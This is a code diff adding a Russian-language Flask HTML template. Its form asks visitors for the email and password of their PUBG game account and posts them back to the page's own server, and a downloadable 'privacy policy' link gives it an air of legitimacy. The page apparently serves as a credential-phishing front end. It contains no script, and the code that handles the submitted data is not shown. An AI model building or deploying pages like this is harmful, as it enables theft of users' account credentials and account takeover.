@@ -1,0 +1,31 @@
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <title>Главная</title>
+</head>
+<body>
+  <link rel="stylesheet" href="/static/style.css">
+  <h1>Форма</h1>
+  <form method="post">
+    <label>Email от вашего аккаунта в PUBG:<br>
+      <input type="email" name="email" required>
+    </label><br><br>
+
+    <label>Пароль от вашего аккаунта в PUBG:<br>
+      <input type="password" name="password" required>
+    </label><br><br>
+
+    <button type="submit">Отправить</button>
+  </form>
+
+  <hr>
+  <h2>Политика конфиденциальности</h2>
+  <!-- Прямая ссылка на конкретный файл -->
+  <p><a href="{{ url_for('download_file', filename='политика_конфиденциальности.txt') }}" download>📥 Скачать Политику конфиденциальности</a></p>
+
+  <p>Или посмотреть полный <a href="{{ url_for('files_list') }}">список файлов</a>.</p>
+  <p></p>
+</body>
+</html>
